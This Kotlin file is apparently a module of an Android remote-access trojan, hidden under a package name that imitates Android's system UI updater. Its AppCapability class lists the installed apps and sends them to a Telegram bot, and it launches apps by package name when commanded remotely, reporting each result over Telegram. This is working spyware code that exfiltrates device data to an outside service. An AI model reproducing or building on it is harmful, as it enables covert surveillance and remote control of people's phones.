package com.android.systemui.updater.capabilities

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import com.android.systemui.updater.TelegramClient

class AppCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    fun listInstalled() {
        val pm = ctx.packageManager
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        val sb = StringBuilder("📱 Installed Apps (${apps.size})\n━━━━━━━━━━━━━━━━\n")
        apps.sortedBy { it.loadLabel(pm).toString() }.take(100).forEach {
            val label = it.loadLabel(pm).toString()
            sb.appendLine("$label: ${it.packageName}")
        }
        if (apps.size > 100) sb.appendLine("...and ${apps.size - 100} more")
        telegram.sendText(sb.toString())
    }

    fun launch(packageName: String) {
        try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(packageName)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
                telegram.sendText("🚀 Launched: $packageName")
            } else {
                telegram.sendText("❌ App not installed: $packageName")
            }
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot launch $packageName: ${e.message}")
        }
    }
}
